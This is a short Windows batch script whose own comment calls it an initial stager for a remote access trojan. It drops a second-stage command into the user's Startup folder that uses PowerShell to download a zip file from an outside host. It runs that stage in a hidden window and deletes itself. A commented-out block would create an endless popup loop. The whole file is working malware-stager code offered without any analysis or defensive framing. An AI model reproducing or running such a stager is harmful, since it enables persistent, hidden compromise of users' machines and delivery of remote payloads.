@echo off

@rem initial stager for the rat

set InitialPath=%cd%
set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %StartupDir%

@rem generate payload
(echo powershell -c "iwr -uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -outfile '.\popsip.zip'")>stage2.cmd

@rem run the payload
powershell start-process powershell.exe -windowstyle hidden ".\stage2.cmd"

@rem move back to saved directory
cd %InitialPath%

del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

